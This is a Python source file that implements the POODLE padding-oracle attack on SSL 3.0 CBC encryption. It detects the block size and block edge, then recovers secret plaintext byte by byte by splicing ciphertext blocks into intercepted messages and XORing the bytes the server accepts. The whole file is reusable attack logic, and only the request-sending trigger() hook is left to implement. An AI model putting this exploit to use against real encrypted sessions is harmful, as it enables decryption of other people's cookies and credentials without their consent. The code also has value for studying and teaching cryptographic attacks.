import binascii

class POODLE(object):
    PHASE_BOUNDS_CHECK = 0
    PHASE_EXPLOIT = 1

    def __init__(self):
        self.phase = POODLE.PHASE_BOUNDS_CHECK
        self.recovery_length = None
        self.block_edge = None
        self.block_size = None
        self.was_error = False
        self.was_success = False
        self.message = None
        self.plaintext = []
        self.target_block = None
        return

    def mark_error(self):
        self.was_error = True
        return

    def mark_success(self):
        self.was_success = True
        return

    def run(self):
        self.detect_block_info()
        print("Found block edge: %u, block size: %d bytes, recovery length: %d bytes, going for exploit!" %
              (self.block_edge, self.block_size, self.recovery_length))
        self.phase = POODLE.PHASE_EXPLOIT
        if self.exploit():
            return self.plaintext
        return

    def exploit(self):
        block_max = int(self.recovery_length / self.block_size)
        for block in range(1, block_max):
            for i in reversed(range(self.block_size)):
                plain = self.find_byte(block, i)
                if not plain:
                    return None
                self.plaintext.append(plain)

        return self.plaintext

    def find_byte(self, block, byte):
        if block < 1:
            raise RuntimeError('Cannot work on block 0')
        self.target_block = block

        prefix_length = self.block_size + byte
        suffix_length = self.block_size - byte

        attempts_to_make = 1500     # The theory is, that after 256 attempts, the byte is known
        for tries in range(attempts_to_make):
            self.was_error = False
            self.was_success = False

            self.trigger('A' * (self.block_edge + prefix_length), 'A' * suffix_length)
            if self.was_success:
                char1 = self.block(block - 1)[-1]
                char2 = self.block(-2)[-1]

                # Python 2: Incoming message is a string, not bytes
                #plain = chr(ord(char1) ^ ord(char2) ^ (self.block_size - 1))
                plain_value = char1 ^ char2 ^ (self.block_size - 1)
                plain = chr(plain_value)
                print('Found block %u byte %u after %u tries: 0x%02x "%c"' % (block, byte, tries + 1, plain_value, plain))

                return plain

        print("Giving up after %d attempts." % attempts_to_make)

        return None

    def message_callback(self, msg):
        self.message = msg
        if self.phase != POODLE.PHASE_EXPLOIT:
            return False, msg
        return True, self.alter()

    def alter(self):
        # Python 3: Message is bytes already.
        msg = self.message
        msg = msg[:-self.block_size] + self.block(self.target_block)
        return msg

    def block(self, n):
        return self.message[n * self.block_size:(n + 1) * self.block_size]

    def detect_block_info(self):
        msg = self.trigger('')
        if not msg:
            print("detect_block_info() Failed! Didn't receive initial message. Exit.")
            exit(1)
        reference = len(msg)
        self.recovery_length = len(self.message)

        for i in range(1, 15):
            msg = self.trigger('A' * i)
            if not msg:
                print("detect_block_info() Failed! Didn't receive a message. Exit.")
                exit(1)
            self.block_size = len(msg) - reference
            if self.block_size != 0:
                self.block_edge = i
                break

        return

    def trigger(self, prefix, suffix=''):
        raise NotImplementedError("Yes. Implement trigger()")
